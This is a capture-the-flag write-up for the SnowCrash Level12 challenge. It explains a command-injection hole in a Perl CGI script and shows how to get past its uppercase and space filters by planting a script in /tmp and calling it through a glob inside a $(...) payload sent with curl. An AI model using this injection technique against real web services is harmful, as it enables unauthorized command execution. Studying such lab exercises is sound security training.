# Level12

**Box**: SnowCrash

**Name**: Level12

**Category**: Command Injection / CGI

**Difficulty**: Medium

## Analysis

Explore the directory:

```bash
ls -la
```

I find a Perl script `level12.pl`. The objective is to get the flag.

Display the script content:

```bash
cat level12.pl
```

The script is a Perl CGI program that listens on localhost:4646 and retrieves two HTTP parameters:
- `param("x")`
- `param("y")`

The main function called is:

```perl
n(t(param("x"), param("y")));
```

## Code Analysis

In the `t()` function:

```perl
$xx = $_[0];
$xx =~ tr/a-z/A-Z;
$xx =~ s/\s.*//;
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```

Important observations:
- User input `x` is stored in `$xx`
- `$xx` is transformed to uppercase
- Everything after a space is removed
- `$xx` is then injected into a shell command executed with backticks

```perl
`egrep "^$xx" /tmp/xd`
```

This means user input is executed in a shell command, revealing a command injection vulnerability.

## Constraints to Bypass

Two filters exist:
1. Conversion to uppercase
2. Removal of spaces

It is therefore impossible to use directly:

```
$(getflag)
```

Because it becomes:

```
$(GETFLAG)
```

And the command does not exist.

## Exploitation Strategy

We bypass the filter by:
1. Creating a script in `/tmp`
2. Calling this script via shell glob (`*`)

### Create the script

```bash
echo 'getflag > /tmp/flag2' > /tmp/X
chmod +x /tmp/X
```

This script will execute getflag and write the result to `/tmp/flag2`.

### Exploit the injection

Send the HTTP request:

```bash
curl 'http://localhost:4646/?x=$(/*/X)&y=1'
```


The script is then executed with level12 permissions, allowing getflag to run.

## Retrieve the flag

```bash
cat /tmp/flag2
```

The flag is displayed.

## Conclusion

The program is vulnerable because it directly concatenates user input into a shell command executed via backticks:

```perl
`egrep "^$xx" /tmp/xd`
```

By bypassing the uppercase filter using a shell glob and an external script, we can execute arbitrary commands, notably `/bin/getflag`.

## Flag

**FLAG_FOUND**
